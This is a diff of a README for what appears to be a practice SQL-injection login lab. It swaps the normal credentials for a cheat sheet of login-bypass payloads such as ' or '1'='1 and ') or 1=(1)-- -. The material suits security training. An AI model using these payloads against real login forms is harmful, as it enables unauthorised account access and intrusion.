@@ -1,15 +1,19 @@
-# LoginBypass-1
+# LoginBypass FULL
 SQL Injection Login page 
 
-Login page with user name and password verification
-Both user name and password field are prone to code injection.
-
-Credentials for logging in normally
+Cheat sheet
 
 | User name  | 	Password |
 | ------------- | ------------- |
-| admin  | admin  |
-| serhat  | serhat  |
+| serhat	  | ' or '1'='1	  |
+| serhat  | ' or 1='1	  |
+| serhat  | 1' or 1=1 -- -	  |
+| serhat  | ' or '1'='1	  |
+| serhat  | ') or 1=('1		  |
+| serhat  | ') or 1=(1)-- -	  |
+| ') or 1=('1  | hadilen	  |
+| serhat  | ") or 1=("1		  |
+| serhat  | ") or 1=(1)-- -	  |
+| serhat  | ") or 1=("1	  |
+| ' or '1'='1'#  | sonuncu	  |
 
-
-Cheat sheet
